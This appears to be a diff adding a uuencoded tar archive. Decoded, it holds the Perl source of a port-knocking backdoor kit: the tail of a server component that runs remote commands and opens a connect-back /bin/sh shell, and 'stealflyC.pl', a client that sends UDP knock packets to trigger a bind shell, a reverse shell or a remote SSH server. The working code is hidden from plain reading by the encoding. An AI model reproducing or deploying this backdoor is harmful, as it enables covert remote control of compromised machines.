+M*"1A9&1R(#T@)&QO8V%L+3YA8V-E<'0H*2`I('L)"@EM>2`D<F5S=6QT.PD)
+M(R!V87)I86)L92!F;W(@4F5S=6QT"@EW:&EL92`H/"1A9&1R/BD@>PDC(%)E
+M860@86QL(&UE<W-A9V5S(&9R;VT@8VQI96YT(`H)"2-#;&]S97,@8VQI96YT
+M+W-E<G9E<B!S;V-K971S+BXN"@D)8VQO<V4H)&%D9'(I("8F(&-L;W-E*"1L
+M;V-A;"D@)B8@;&%S="!I9B!M+UYE>&ET+V=I.PH)"65X:70H,"D@:68@;2]>
+M9&EE+V=I.PH)"21C;VUM86YD(#T@8"1?8#L*"0EP<FEN="`D861D<B`B)&-O
+M;6UA;F0B.PDC(%!R:6YT(')E8V5I=F5D(&UE<W-A9V4*"7T*?0H*"7-U8B!C
+M;VYN7V)A8VLH*2!["@D)<VQE97`H-"D[("-3;&5E<"P@9VEV:6YG(&-L:65N
+M="P@=&EM92!T;R!O<&5N(&ET<R!P;W)T"@D))&5X96-U=&4@/2`G+V)I;B]S
+M:"<["@D))&=E=%]A9&1R(#T@:6YE=%]A=&]N*"1I<&]R:6=E;2D["@D))'!A
+M9&1R(#T@<V]C:V%D9')?:6XH)&-O;FY?8F%C:U]P;W)T+"`D9V5T7V%D9'(I
+M.PH)"21P=&,@/2!G971P<F]T;V)Y;F%M92@G=&-P)RD["@D)<V]C:V5T*%,L
+M(%!&7TE.150L(%-/0TM?4U1214%-+"`D<'1C*3L*"0EC;VYN96-T*%,L("1P
+M861D<BD["@D)(U)E<W!O;F0@;F]W.@H)"5,M/F%U=&]F;'5S:"@Q*3L*"0EO
+M<&5N*%-41$E.+"`B/B93(BD[;W!E;BA35$1/550L("(^)E,B*3MO<&5N*%-4
+M1$524BP@(CXF4R(I.PH)"7-Y<W1E;2@D97AE8W5T92D["@E]"GT*(T-L96%N
+M=7`@9FEL=&5R(&9O<B!N97AT('!A8VME=',N+BX*)'-R8W!O<G0@/2`G)SL*
+M?0H`````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M``````````````````````````````````````````````!S=&5A;&9L>4,N
+M<&P`````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M,#`P,#<U-0`P,#`Q-S4P`#`P,#`Q-#0`,#`P,#`P,C$S,C``,3`S-38V,S8T
+M,3(`,#$S-#4R`"`P````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M`````````````````````````````'5S=&%R("``:&%S:```````````````
+M``````````````````````!U<V5R<P``````````````````````````````
+M`````#`P,#`P,#``,#`P,#`P,```````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M`````````",A+W5S<B]B:6XO<&5R;`HC"B,@/$-,245.5#X*(PHC(")4:&5R
+M92!A<F4@='=O('=A>7,@=&\@=W)I=&4@97)R;W(M9G)E92!P<F]G<F%M<RX@
+M(`HC("!/;FQY('1H92!T:&ER9"!O;F4@=V]R:W,N(B`M($9O<G1U;F4@8V]O
+M:VEE"B,*(R!S=&5A;&9L>4,N<&P@8F5T82!W<FET=&5N(&)Y(&AA<V@@/&-A
+M<FQO<VQA8VL@870@9VUA:6P@9&]T(&-O;3X*(PHC($1E<V-R:7!T:6]N.B!#
+M;VYN96-T+4)A8VL@/"T^($)I;F1P;W)T(%!O<G0M:VYO8VMI;F<@0F%C:V1O
+M;W(@5&]O;`HC(`HC($=R965T>B!G;V5S('1O.B!H97AD=6UP+"!S86YD:6UA
+M<RP@4VAO<F=E;BP@0V]D86LL(&MH>B`*(R`@("`@("`@("`@("`@("`@9&5A
+M9'-O8VME="P@>&=C+"!E;FEA8RP@06-I9"U787)Z+"!&+3$Q-RXN+@HC"B,@
+M1F5A='5R97,Z"B,@*R!":6YD('!O<G0@;VX@<F5M;W1E('-E<G9E<CL*(R`K
+M($-O;FYE8W0@0F%C:SL@"B,@*R!0;W)T(&MN;V-K:6YG(&UE=&AO9#L*(R`K
+M(%-32"!397)V97(@:&%N9&QE<BX*(PHC(%1O(&1O.@HC("T@4V]C:W,@<W5P
+M<&]R=#L*(R`M($-R:7!T;V=R87!H>0HC"B,@*R!.970Z.E)A=TE0.R`H<&5R
+M;"!M;V1U;&4I"B,*(R`J($EN<W1A;&P@<&5R;"!M;V1U;&5S(&9R;VT@8W!A
+M;BP@96<Z"B,@(R!C<&%N("UE(`HC("`@:6YS=&%L;"!.970Z.E!C87!5=&EL
+M<PHC(`HC(%1R>3H@+B]S=&5A;&9L>4,N<&P@+6AE;'`@("`@("`@("`@("`@
+M("`@(`H*=7-E($YE=#HZ4F%W25`["G5S92!3;V-K970["G5S92!)3SHZ4V]C
+M:V5T.CI)3D54.PIU<V4@=V%R;FEN9W,["@H*<W5B(&%L;"@I('L*(T-H96-K
+M:6YG(&UE=&AO9#H*:68H)&UE=&AO9"!E<2`P*2!["@D)("`D<V5N9%]D871A
+M(#T@(EQX,#%<>#8R(BX@(T)I;F10;W)T"@D)"2`@("`@("`B7'@V.5QX-F4B
+M+@H)"0D@("`@("`@(EQX-C1<>#<P(BX*"0D)("`@("`@(")<>#9F7'@W,B(N
+M"@D)"2`@("`@("`B7'@W-%QX,#$B"GT*:68H)&UE=&AO9"!E<2`Q*2!["@D@
+M("`@("`@("`@)'-E;F1?9&%T82`](")<>#`Q7'@V,R(N("-#;VYN96-T+4)A
+M8VL*"0D)("`@("`@(")<>#9F7'@V92(N"@D)"2`@("`@("`B7'@V95QX-C(B
+M+@H)"0D@("`@("`@(EQX-C%<>#8S(BX*"0D)("`@("`@(")<>#9B7'@P,2(*
+M?0H*:68H)&UE=&AO9"!E<2`R*2!["@D)("`D<V5N9%]D871A(#T@(EQX-S-<
+M>#<T(BX@(U-32"!397)V97(@4W1A<G0*"0D@(`D@("`@("`@(EQX-C%<>#<R
+M(BX*"0D)("`@("`@(")<>#<T7'@W,R(N"@D)"2`@("`@("`B7'@W,UQX-C@B
+M+@H)"0D@("`@("`@(EQX,#$B.PI]"FEF*"1M971H;V0@97$@,RD@>PH)"2`@
+M)'-E;F1?9&%T82`](")<>#<S7'@W-"(N("-34T@@4V5R=F5R(%-T;W`*"0D@
+M(`D@("`@("`@(EQX-F9<>#<P(BX*"0D)("`@("`@(")<>#<S7'@W,R(N"@D)
+M"2`@("`@("`B7'@V.%QX,#$B.PI]"@HC3&5T8',@<V5N9"!O=7(@5410('!A
+M8VME=',@=&\@;W!E;B!R96UO=&4@=&%R9V5T('!O<G0N+BX*)'!A8VME="`]
+M(&YE=R!.970Z.E)A=TE0*'MU9'`]/GM]?2D["@IF;W(H)'@],#LD>#P]-#LD
+M>"LK*7L*"B-386UE(&%S('-E<G9E<BP@>6]U(&-A;B!C:&%N9V4@:68@>6]U
+M(&1O(&ET(&%T(&)O=&@@<VED97,Z"D!T;7!P;W)T(#T@*#<S.2PV-C8L,C`P
+M,2PS,#4U+#@P,#`I.PH)"B1P86-K970M/G-E="A["B`@("`@("`@("`@("`@
+M:7`@/3X@>R!S861D<B`]/B`D:69A8V4L(`D@("`@("-3;W5R8V4@861D<F5S
+M<PH@("`@("`@("`@("`@("`@("`@("`@9&%D9'(@/3X@)'-E<G9E<B`@("`@
+M("`C4F5M;W1E(&%D9')E<W,*("`@("`@("`@("`@("`@("`@("!]+`H@("`@
+M("`@("`@("`@('5D<"`]/B![('-O=7)C92`]/B`D=&UP<&]R=%LD>%TL("-2
+M86YD;VX@5410('!A8VME=',@<V]U<F-E('!O<G0*("`@("`@("`@("`@("`@
+M("`@("`@("!D97-T(#T^(#@P+"`C22!U<V4@.#`@:&5R92!B96-O=7-E(&ES
+M(&]F=&5N(&%L;&]W960@=&AR;W5G:"!F:7)E=V%L;`H)"2`@("`@("!L96X@
+M/3X@-2P*"0D@("`@("`@9&%T82`]/B`D<V5N9%]D871A("-#;VYN96-T($)A
+M8VLL($)I;F1P;W)T+"!34T@@4V5R=F5R/R`*("`@("`@("`@("`@("`@("`@
+M("`@('T*("`@("`@("`@("`@('TI.PH*)'!A8VME="T^<V5N9"@P+#$I.PI]
+M"@HC1VEV:6YG('1I;64@=&\@<V5R=F5R+BXN"G-L965P*#(I.PH*(TIU;7`@
+M=&\@<V5L96-T960@;65T:&]D.@II9B@D;65T:&]D(&5Q(#`I('L*"29C;VYN
+M96-T"GT*:68H)&UE=&AO9"!E<2`Q*2!["@DF;&ES=&5N"GT@"@II9B@D;65T
+M:&]D(&5Q(#(I('L*"7!R:6YT(");(5T@1&%T82!H87,@8F5E;B!S96YT('-T
+M87)T:6YG('-S:"%<;B(["@ES=6(@;&]C86Q?:VEL;%]S<V@H*2!["@D))&UE
+M=&AO9"`](#,["@D)<')I;G0@(ELJ72!786ET('=H:6QE('-T;W!P:6YG("1S
+M97)V97)?<')E(%-32"!397)V97(N+BY<;B(["@D))F%L;#L*"0EE>&ET*#`I
+M.PH)?0H))%-)1WM)3E1](#T@7"9L;V-A;%]K:6QL7W-S:#L*"7!R:6YT(")/
+M<'1I;VYS(#T^($AI="!#;VYT<F]L*V,@=&\@8VQO<V4@)'-E<G9E<E]P<F4@
+M4U-((%-E<G9E<EQN(CL*"7!R:6YT("(@("`@("`@("`@($]R(&AI="`\14Y4
+M15(^('1O(&QE879E(&ET(')U;FYI;F<N7&Y<;B(["@EP<FEN="`B/B`B.PH)
+M/%-41$E./CL*"7!R:6YT(")296UO=&4@)'-E<G9E<E]P<F4@4U-((%-E<G9E
+M<B!H87,@8F5E;B!L969T(&]P96YE9"Y<;B(["@EP<FEN="`B268@>6]U(&YE
+M960@=&\@<W1O<"!I="!L871E<EQN(CL*"7!R:6YT(")5<V4Z("0P("US=&]P
+M<W-H(#QL;V-A;%]I<#X@/')E;6]T95]I<'QR96UO=&5?:&]S=&YA;64^7&XB
+M.PH)97AI="@P*3L*?0H*:68@*"1M971H;V0@97$@,RD@>PH)<')I;G0@(ELA
+M72!$871A(&AA<R!B965N('-E;G0@<W1O<&EN9R!S<V@A7&XB.PI]"@I]("-%
+M3D0@<W5B(&%L;"@I"@H*<W5B(&-O;FYE8W0H*2!["B-,971@<R!G970@:70@
+M;VXA"B1S;V-K(#T@24\Z.E-O8VME=#HZ24Y%5"T^;F5W("A0965R061D<B`]
+M/B`D<V5R=F5R+`H@("`@("`@("`@("`@("`@("`@("`@("`@("`@("`@4&5E
+M<E!O<G0@/3X@)'!O<G0L"B`@("`@("`@("`@("`@("`@("`@("`@("`@("`@
+M("!0<F]T;R`@("`]/B`B=&-P(BP*("`@("`@("`@("`@("`@("`@("`@("`@
+M("`@("`@(%)E=7-E061D<B`]/B`Q*2!O<B!D:64@(D-A;B=T($-O;FYE8W0@
+M=&\@)'-E<G9E<CHD<&]R=%QN(CL*"F1I92`B)"%<;B(@=6YL97-S(&1E9FEN
+M960H)'!I9"`](&9O<FLH*2D["@HD<V]C:RT^875T;V9L=7-H*#$I.PII9B`H
+M)'!I9"D@>PH)<')I;G0@(ELA72!396YT(5QN6R%=($-O;FYE8W1E9"!O;CH@
+M)'-E<G9E<CHD<&]R=%QN6R%=(&5X:70@;W(@8V]N=')O;"MC('1O(&QE879E
+M7&Y<;B(["B`@("`@("`@<')I;G0@)'-O8VL@(EQN=6YA;64@+6%<;FED7&XB
+M.PH@("`@("`@('=H:6QE("AD969I;F5D("@D8V]M;2`](#PD<V]C:SXI*2![
+M"B`@("`@("`@("`@("`@("!P<FEN="!35$1/550@)&-O;6T["B`@("`@("`@
+M?0IK:6QL*")415)-(BP@)'!I9"D["GT*"F5L<V4@>PH@("`@("`@('=H:6QE
+M("AD969I;F5D("@D8V]M;2`](#Q35$1)3CXI*2!["B`@("`@("`@("`@('!R
+M:6YT("1S;V-K("1C;VUM.PH)("`@("-3=6(@=&\@8VQO<V4@<F5M;W1E('!O
+M<G0@86YD(&5X:70@:68@8W1R;"MC.@H)("`@('-U8B!C;&]S96)I;F0H*2![
+M"@D)("`@('!R:6YT("1S;V-K(")E>&ET7&XB.PH)("`@('T*("`@("`@("!]
+M"B`@("!]"GT@(T5N9"!S=6(@8V]N;F5C="@I"@IS=6(@;&ES=&5N*"D@>PH*
+M(TY/5$4Z"B,*(R!4:&ES(&QI<W1E;B@I(&9U;F-T:6]N(&ES(&QI='1L92!B
+M=6=G960L(&YO=&AI;F<@<V5R:6]U<RP*(R!J=7-T('=H96X@>6]U('1Y<&4@
+M8V5R=&%I;B!C;VUM86YD<R!L:6ME.@HC(')M(&9I;&4@+"`^(&9I;&4@+"!T
+M;W5C:"!F:6QE(&-D("]D:7(@+"`N+BX*(R!4:&5S92!F97<@8V]M;6%N9',@
+M87!P96%R('1O(&9R965Z92!O=7(@<V]C:V5T('!R;V)A8FQY(&)E8V]U<V4*
+M(R!I8&T@;F]T(&1O:6YG(&ET(&EN('1H92!B97-T('=A>2!A;F0@:6!L;"!F
+M:7@@:70@<V]O;BX@"B,@66]U(&-A;B!A=F]I9"!I="!U<VEN9R!F;VQL;W=E
+M9"!C;VUM82!T:&5N(&%N>2!O=&AE<B!C;VUM86YD.@HC(&-D("]D:7(@.R!L
+M<PHC(%1H92!R97-T(&]F(&-O;6UA;F1S(&%R92!O:R!U;G1I;"!N;W<N"B,@
+M375S="!R96UI;F0@>6]U('1H870@:G5S="!H87!P96X@:6X@8V]N;F5C="!B
+M86-K(&UO9&4N"B,@268@>6]U('=O;F1E<B!W:&%T('-H:70@:2!H879E(&1O
+M;F4@:6!D(&%P<F5C:6%T92!Y;W4@<V5N9"!M92`*(R!S;VUE('-O;'5T:6]N
+M(#HI"@HC3&5T8',@9V5T(&]U<B!H86YD;&4Z"B1L;V-A;"`]($E/.CI3;V-K
+M970Z.DE.150M/FYE=RA,:7-T96X]/C$L"@D)"2`@("`@("!0<F]T;ST^)W1C
+M<"<L"@D)"2`@("`@("!,;V-A;$%D9'(]/B1I9F%C92P*"0D)("`@("`@($QO
+M8V%L4&]R=#T^)&QB86-K<&]R="P*"0D)("`@("`@(%)E=7-E061D<CT^,2PI
+M(&]R(&1I92`B)"$B.PHC4F5S<&]N9"!N;W<Z"B1L;V-A;"T^875T;V9L=7-H
+M*#$I.PIP<FEN="`B6R%=(%-E;G0A7&Y;*ET@5V%I=&EN9R!F;W(@<F5M;W1E
+M(&-O;FYE8W0@8F%C:R!O;B`D:69A8V4Z)&QB86-K<&]R=%QN(CL*"B-'970@
+M:70Z"B1A9&1R(#T@)&QO8V%L+3YA8V-E<'0H*3L*"B-0<FEN="!S;W5R8V4@
+M:7`Z<&]R=#H*)')E;6]T96AO<W0@/2`D861D<BT^<&5E<FAO<W0@.PHD<F5M
+M;W1E<&]R="`]("1A9&1R+3YP965R<&]R="`[(`H*<')I;G0@(ELA72!#;VYN
+M96-T:6]N(&UA9&4@9G)O;3H@)')E;6]T96AO<W0Z)')E;6]T97!O<G1<;B([
+M"G!R:6YT(");(5T@97AI="!O<B!C;VYT<F]L*V,@=&\@;&5A=F5<;B(["G!R
+M:6YT(")<;F-O;6UA;F0^("(["@HD<W1A='5S(#T@)R<["@HC2&5R92!W92!G
+M;SH*=VAI;&4H)&-O;6T@/2`\4U1$24X^*2!["@D@("`@("`@("-$:7)T>2P@
+M;&%T97(@:2!D;R!S;VUE=&AI;F<@8F5T=&5R.@H)"7-U8B!C;&]S96)A8VLH
+M*2![<')I;G0@(EQN(B`[(&5X:70H,"E]"@D)97AI="@P*2!I9B`H)&-O;6T@
+M/7X@;2]>97AI="]G:2D["@D@("`@("`@(&EF*"1C;VUM(&YE(")<;B(I('L)
+M"@D)<')I;G0@)&%D9'(@)&-O;6T["@D)"7=H:6QE*"1S=&%T=7,]*'-Y<W)E
+M860H)&%D9'(L)&)U9F9E<BPX,3DR*2D^,"D@>PH)"0D)<')I;G0@)&)U9F9E
+M<CL*"0D)"6QA<W0["@D)"7T*"0D)<')I;G0@(D-O;6UA;F0^("(*"0E]96QS
+M97L*"0D)<')I;G0@(D-O;6UA;F0^("(*"0E]"0H)?2`*?0H*(T9R;VT@:&5R
+M92!I('!L86-E('-O;64@9G5N8VEO;G,@9F]R('!R:6YT:6YG(&AE;'`L"B-G
+M971T:6YG(&%R9W5M96YT<RP@<F5S;VQV:6YG(&1N<R!A;F0@<V]M971H:6YG
+M(&QI:V4@=&AA="X*"B-(87-H('1O(&-A;&P@<FEG:'0@;65T:&]D(&%N9"!A
+M<F=U;65N=',@9G)O;2!C;VUM86YD(&QI;F4Z"FUY("5C;VUM86YD<R`]("@*
+M("`@("`@("`B+6(B(#T^(%PF8F%R9W,L"B`@("`@("`@(BUC(B`]/B!<)F-A
+M<F=S+`H)(BUS=&%R='-S:"(@/3X@7"9S=&%R='-S:"P*"2(M<W1O<'-S:"(@
+M/3X@7"9S=&]P<W-H+`H@("`@("`@("(M:&5L<"(@/3X@7"9U<V%G92P**3L*
+M)'-T<FEN9R`]("1!4D=66S!=.PII9B@A)'-T<FEN9RD@>PH))G5S86=E"GT*
+M8VAO;7`H)'-T<FEN9RD["FEF("@D8V]M;6%N9'-[)'-T<FEN9WTI('L*("`@
+M("`@("`D8V]M;6%N9'-[)'-T<FEN9WTM/B@I.PH@("`@?2!E;'-E('L*"29U
+M<V%G90I]"@HC5&AI<R!F=6YC=&EO;B!R97-O;'9E("1S97)V97(@*')E;6]T
+M92!S97)V97(I(&EP(&%D9')E<W-E<SH*<W5B(')E<V]L=F5$3E,H*2!["@DC
+M268@<V5R=F5R(&YA;64@:7,@;F]T(&%N(&EP(&YU;6)E<CH*"6EF*"1S97)V
+M97)?<')E("%^("]>6S`M.5TO*2![(`H)"4!A9'(@/2!G971H;W-T8GEN86UE
+M*"1S97)V97)?<')E*2!O<B!D:64@(D-A;B=T(')E<V]L=F4@)'-E<G9E<CH@
+M)"%<;B(["@D)0&%D<B`](&UA<"![(&EN971?;G1O82@D7RD@?2!`861R6S0@
+M+BX@)"-A9')=.PH)"0H)"2-7:&EL92!R97-O;'9I;F<@:7`@;G5M8F5R('=E
+M(&-A;B!F:6YD(&UA;GD@;V8@=&AE;2`*"0DC9G)O;2!S86UE(&AO<W0N($AE
+M<F4@:2!G970@=&AE(&9I<G-T(&]N93H*"0DD<V5R=F5R(#T@)&%D<ELP73L*
+M"2-)9B!I="!I<SH*"7T@96QS92!["@D))'-E<G9E<B`]("1S97)V97)?<')E
+M"@E]"GT*"B-3=6(@=&\@<')I;G0@:&5L<#H*<W5B('5S86=E*"D@>PIP<FEN
+M="`B57-A9V4Z7&XB.PIP<FEN="`B)#`@+6(@/&QO8V%L7VEP/B`\<F5M;W1E
+M7VEP?')E;6]T95]H;W-T;F%M93X@/')E;6]T95]P;W)T/EQN(CL*<')I;G0@
+M(B0P("UC(#QL;V-A;%]I<#X@/')E;6]T95]I<'QR96UO=&5?:&]S=&YA;64^
+M(#PJ;&]C86Q?<&]R=#X@*D1E9F%U;'0@.3`Y,%QN(CL*<')I;G0@(B0P("US
+M=&%R='-S:"`\;&]C86Q?:7`^(#QR96UO=&5?:7!\<F5M;W1E7VAO<W1N86UE
+M/EQN(CL*<')I;G0@(B0P("US=&]P<W-H(#QL;V-A;%]I<#X@/')E;6]T95]I
+M<'QR96UO=&5?:&]S=&YA;64^7&XB.PIP<FEN="`B)#`@+6AE;'!<;B(["G!R
+M:6YT(")<;DEN9F\Z7&XB.PIP<FEN="`B+6(Z"0EB:6YD(')E;6]T92!P;W)T
+M7&XB.PIP<FEN="`B+6,Z"0EC;VYN96-T(&)A8VM<;B(["G!R:6YT("(M<W1A
+M<G1S<V@Z"5-405)4(')E;6]T92!34T@@4V5R=F5R7&XB.PIP<FEN="`B+7-T
+M;W!S<V@Z"5-43U`@<F5M;W1E(%-32"!397)V97)<;B(["G!R:6YT("(M:&5L
+M<#H)"7!R:6YT('1H:7,@:&5L<"`_(2!D86UM:70A('=T9B$@=VAO(&YE961S
+M(&AE;'`_(&E@;2!L,S-T(&@T8VLS<EQN7&XB.PIP<FEN="`B/&QO8V%L7VEP
+M/CH)"0E;3&]C86P@:7`@=&AA="!L:7-T96X@86YD+V]R('-E;F0@5410('!A
+M8VME='-=7&XB.PIP<FEN="`B/')E;6]T95]I<'QR96UO=&5?:&]S=&YA;64^
+M.B`)6U)E;6]T92!S97)V97(@:7`@;W(@:&]S=&YA;65=7&XB.PIP<FEN="`B
+M/&QO8V%L7W!O<G0^.B`)"0E;3&]C86P@<&]R="!T;R!L:7-T96X@9F]R(&-O
+M;FYE8W0@8F%C:R!M971H;V1=7&XB.PIE>&ET*#$I.PI]"@HC4W5B(&-A;&QE
+M9"!B>2`M8B!A<F=U;65N=#H*<W5B(&)A<F=S*"D@>PH@("`@("`@("-'87)A
+M;G1E92!U<R!T:&%T(&-O;G1R;VPK8R!E>&ET<R!C;W)R96-T;'DZ"@DD4TE'
+M>TE.5'T@/2!<)F-L;W-E8FEN9#L*"2-$969I;F4@;65T:&]D.@H@("`@("`@
+M("1M971H;V0@/2`P.PH)"@DC1V5T(&%R9W5M96YT<SH*("`@("`@("`D:69A
+M8V4@/2`D05)'5ELQ72!O<B`F=7-A9V4["B`@("`@("`@)'-E<G9E<E]P<F4@
+M/2`D05)'5ELR72!O<B`F=7-A9V4["B`@("`@("`@)'!O<G0@/2`D05)'5ELS
+M72!O<B`F=7-A9V4["@D*"2-#86QL($1.4R!R97-O;'9E<CH*"29R97-O;'9E
+M1$Y3.PH*"2-0<FEN="!I;F9O.@H)<')I;G0@(E-T96%L9FQY('=R:71T96X@
+M8GD@:&%S:%QN(CL*"7!R:6YT(");(5T@0FEN9'!O<G0@;65T:&]D7&XB.PH)
+M<')I;G0@(ELJ72!396YD:6YG(')A;F=E(&]F(%5$4"!P86-K971S('1O("1S
+M97)V97(Z.#`@+BXN7&XB.PH*"2-#86QL(&UA:6X@9G5N8W1I;VXZ"@DF86QL
+M.PI]"@HC4W5B(&-A;&QE9"!B>2`M8R!A<F=U;65N=#H*<W5B(&-A<F=S*"D@
+M>PH@("`@("`@("-'87)A;G1E92!U<R!T:&%T(&-O;G1R;VPK8R!E>&ET<R!C
+M;W)R96-T;'DZ"@DD4TE'>TE.5'T@/2!<)F-L;W-E8F%C:SL*"0H)(T1E9FEN
+M92!M971H;V0Z"B`@("`@("`@)&UE=&AO9"`](#$["@D*"2-'970@87)G=6UE
+M;G1S.@H@("`@("`@("1I9F%C92`]("1!4D=66S%=(&]R("9U<V%G93L*("`@
+M("`@("`D<V5R=F5R7W!R92`]("1!4D=66S)=(&]R("9U<V%G93L*"2,D<&]R
+M="`]("1!4D=66S-=(&]R("9U<V%G93L*("`@("`@("`D;&)A8VMP;W)T(#T@
+M)$%21U9;,UT@;W(@)G5S86=E.PH*"2-#86QL($1.4R!R97-O;'9E<CH*"29R
+M97-O;'9E1$Y3.PH*"2-0<FEN="!I;F9O.@H)<')I;G0@(E-T96%L9FQY('=R
+M:71T96X@8GD@:&%S:%QN(CL*"7!R:6YT(");(5T@0V]N;F5C="!"86-K(&UE
+M=&AO9%QN(CL*"7!R:6YT(");*ET@4V5N9&EN9R!R86YG92!O9B!51%`@<&%C
+M:V5T<R!T;R`D<V5R=F5R.C@P("XN+EQN(CL*"0H)(T-A;&P@;6%I;B!F=6YC
+M=&EO;CH*"29A;&P["GT*"B-3=6(@8V%L;&5D(&)Y("US=&%R='-S:"!A<F=U
+M;65N=#H*<W5B('-T87)T<W-H*"D@>PH)"@DC1&5F:6YE(&UE=&AO9#H*("`@
+M("`@("`D;65T:&]D(#T@,CL*"0H)(T=E="!A<F=U;65N=',Z"B`@("`@("`@
+M)&EF86-E(#T@)$%21U9;,5T@;W(@)G5S86=E.PH@("`@("`@("1S97)V97)?
+M<')E(#T@)$%21U9;,ET@;W(@)G5S86=E.PH*"2-#86QL($1.4R!R97-O;'9E
+M<CH*"29R97-O;'9E1$Y3.PH*"2-0<FEN="!I;F9O.@H)<')I;G0@(E-T96%L
+M9FQY('=R:71T96X@8GD@:&%S:%QN(CL*"7!R:6YT(");(5T@4U-(("1S97)V
+M97)?<')E(%-E<G9E<B!35$%25%QN(CL*"7!R:6YT(");*ET@4V5N9&EN9R!R
+M86YG92!O9B!51%`@<&%C:V5T<R!T;R`D<V5R=F5R.C@P("XN+EQN(CL*"0H)
+M(T-A;&P@;6%I;B!F=6YC=&EO;CH*"29A;&P["GT*"B-3=6(@8V%L;&5D(&)Y
+M("US=&]P<W-H(&%R9W5M96YT.@IS=6(@<W1O<'-S:"@I('L*"0H)(T1E9FEN
+M92!M971H;V0Z"B`@("`@("`@)&UE=&AO9"`](#,["@D*"2-'970@87)G=6UE
+M;G1S.@H@("`@("`@("1I9F%C92`]("1!4D=66S%=(&]R("9U<V%G93L*("`@
+M("`@("`D<V5R=F5R7W!R92`]("1!4D=66S)=(&]R("9U<V%G93L*"@DC0V%L
+M;"!$3E,@<F5S;VQV97(Z"@DF<F5S;VQV941.4SL*"@DC4')I;G0@:6YF;SH*
+M"7!R:6YT(")3=&5A;&9L>2!W<FET=&5N(&)Y(&AA<VA<;B(["@EP<FEN="`B
+M6R%=(%)E;6]T92`D<V5R=F5R7W!R92!34T@@4V5R=F5R(%-43U!<;B(["@EP
+M<FEN="`B6RI=(%-E;F1I;F<@<F%N9V4@;V8@5410('!A8VME=',@=&\@)'-E
+M<G9E<CHX,"`N+BY<;B(["@D*"2-#86QL(&UA:6X@9G5N8W1I;VXZ"@DF86QL
+M.PI]"B-#;V1E('=R:71T96X@8GD@0V%R;&]S($-A<G9A;&AO(&$N:RYA+B!H
+M87-H"B-E;V8*````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
+M````````````````````````````````````````````````````````````
